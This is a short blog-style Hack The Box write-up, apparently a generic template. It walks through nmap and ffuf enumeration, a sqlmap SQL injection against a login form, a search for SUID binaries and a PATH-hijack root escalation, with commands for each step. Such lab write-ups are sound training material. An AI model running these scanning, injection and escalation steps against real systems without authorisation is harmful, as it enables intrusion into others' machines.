---
title: "HTB Machine Writeup - Example Box"
date: "2024-01-15"
slug: "htb-writeup-example"
category: "HTB"
tags: ["HTB", "Enumeration", "Privilege Escalation", "Linux"]
summary: "A walkthrough of a typical Hack The Box machine covering enumeration, initial access, and privilege escalation techniques."
---

# HTB Machine Writeup - Example Box

This writeup covers a typical Hack The Box machine walkthrough, demonstrating common enumeration and exploitation techniques.

## Initial Enumeration

The first step in any penetration test is comprehensive enumeration. We start with a full port scan to identify open services.

### Port Scanning

```bash
nmap -sC -sV -oA initial_scan 10.10.10.xxx
```

The scan revealed several open ports including SSH on port 22 and a web server on port 80.

### Web Enumeration

The web server hosted a simple application. Directory enumeration revealed an admin panel:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.xxx/FUZZ
```

## Initial Access

After discovering the admin panel, we identified a SQL injection vulnerability in the login form. Using SQLMap, we extracted database credentials:

```bash
sqlmap -u "http://10.10.10.xxx/login" --data "username=admin&password=test" --dbs
```

With database access, we retrieved user credentials and gained SSH access to the system.

## Privilege Escalation

Once on the system, we began enumeration for privilege escalation vectors.

### SUID Binaries

Checking for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

We discovered a custom binary with SUID permissions that was vulnerable to path manipulation.

### Exploitation

By creating a malicious executable and manipulating the PATH environment variable, we were able to execute commands as root:

```bash
echo '/bin/bash' > /tmp/exploit
chmod +x /tmp/exploit
export PATH=/tmp:$PATH
./vulnerable_binary
```

## Conclusion

This machine demonstrated the importance of thorough enumeration and understanding common privilege escalation vectors. Always check for misconfigurations and vulnerable binaries.

